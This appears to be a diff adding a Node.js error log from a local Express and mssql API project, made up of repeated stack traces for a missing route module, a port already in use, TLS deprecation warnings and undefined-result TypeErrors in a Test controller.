@@ -1,0 +1,1655 @@
+node:internal/modules/cjs/loader:1078
+  throw err;
+  ^
+
+Error: Cannot find module './routes/Test'
+Require stack:
+- C:\xampp\htdocs\bauereg\api\app.js
+    at Module._resolveFilename (node:internal/modules/cjs/loader:1075:15)
+    at Module._load (node:internal/modules/cjs/loader:920:27)
+    at Module.require (node:internal/modules/cjs/loader:1141:19)
+    at require (node:internal/modules/cjs/helpers:110:18)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:3:14)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12) {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [ 'C:\\xampp\\htdocs\\bauereg\\api\\app.js' ]
+}
+
+Node.js v18.15.0
+node:internal/modules/cjs/loader:1078
+  throw err;
+  ^
+
+Error: Cannot find module './routes/Test'
+Require stack:
+- C:\xampp\htdocs\bauereg\api\app.js
+    at Module._resolveFilename (node:internal/modules/cjs/loader:1075:15)
+    at Module._load (node:internal/modules/cjs/loader:920:27)
+    at Module.require (node:internal/modules/cjs/loader:1141:19)
+    at require (node:internal/modules/cjs/helpers:110:18)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:3:14)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12) {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [ 'C:\\xampp\\htdocs\\bauereg\\api\\app.js' ]
+}
+
+Node.js v18.15.0
+node:internal/modules/cjs/loader:1078
+  throw err;
+  ^
+
+Error: Cannot find module './routes/Test'
+Require stack:
+- C:\xampp\htdocs\bauereg\api\app.js
+    at Module._resolveFilename (node:internal/modules/cjs/loader:1075:15)
+    at Module._load (node:internal/modules/cjs/loader:920:27)
+    at Module.require (node:internal/modules/cjs/loader:1141:19)
+    at require (node:internal/modules/cjs/helpers:110:18)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:3:14)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12) {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [ 'C:\\xampp\\htdocs\\bauereg\\api\\app.js' ]
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+node:events:491
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::3000
+    at Server.setupListenHandle [as _listen2] (node:net:1740:16)
+    at listenInCluster (node:net:1788:12)
+    at Server.listen (node:net:1876:7)
+    at Function.listen (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\application.js:635:24)
+    at Object.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:12:5)
+    at Module._compile (node:internal/modules/cjs/loader:1254:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1308:10)
+    at Module.load (node:internal/modules/cjs/loader:1117:32)
+    at Module._load (node:internal/modules/cjs/loader:958:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1767:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -4091,
+  syscall: 'listen',
+  address: '::',
+  port: 3000
+}
+
+Node.js v18.15.0
+(node:18632) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:19120) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:14204) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:3572) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+TypeError: Cannot read properties of undefined (reading 'port')
+    at new ConnectionPool (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\connection-pool.js:60:36)
+    at new ConnectionPool (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\connection-pool.js:10:1)
+    at Object.connect (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\global-connection.js:18:24)
+    at getTest (C:\xampp\htdocs\bauereg\api\controllers\Test.js:20:9)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\route.js:144:13)
+    at Route.dispatch (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\route.js:114:3)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:284:15
+    at param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:365:14)
+(node:8400) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:2148) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:15548) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:19072) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:19352) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:4808) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:6244) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:20936) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:14152) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:15320) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:12872) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:18600) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:67
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:67:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:20984) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:13708) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:70
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:70:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:14200) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:70
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:70:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:11148) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:70
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:70:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:14952) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:70
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:70:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
